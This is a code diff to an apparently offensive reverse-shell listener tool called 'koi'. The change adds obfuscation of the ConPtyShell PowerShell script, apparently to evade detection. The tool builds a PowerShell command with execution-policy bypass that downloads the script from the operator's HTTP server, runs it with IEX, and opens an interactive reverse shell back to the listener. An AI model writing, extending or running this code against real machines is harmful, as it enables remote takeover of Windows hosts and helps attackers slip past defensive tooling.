@@ -19,6 +19,7 @@ from koi.cli import print_help
 from koi.modules.loader import load_modules, get_module
 from koi.session import Session, RawTerminal
 from koi.utils.payloads import PayloadGenerator
+from koi.utils.ps_obfuscate import obfuscate_conptyshell
 from koi.utils.ui import (
     colored_text, display_art, print_report_box,
     breaker_with_text, notify, Spinner, print_payloads,
@@ -455,13 +456,14 @@ class Listener:
                 notify('error', f"Failed to fetch ConPtyShell: {exc}")
                 return
 
+        ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
         http_port, http_thread = spawn_http_server(ps1_data, timeout=60.0)
         notify('info', f"Serving ConPtyShell on port {_b(http_port)}")
 
         invoke_cmd = (
             f"powershell -nop -ep bypass -c \""
             f"IEX(IWR 'http://{local_ip}:{http_port}/c.ps1' -UseBasicParsing);"
-            f"Invoke-ConPtyShell -RemoteIp {local_ip} -RemotePort {self.port}"
+            f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {self.port}"
             f" -Rows {rows} -Cols {cols} -CommandLine powershell\""
         )
 
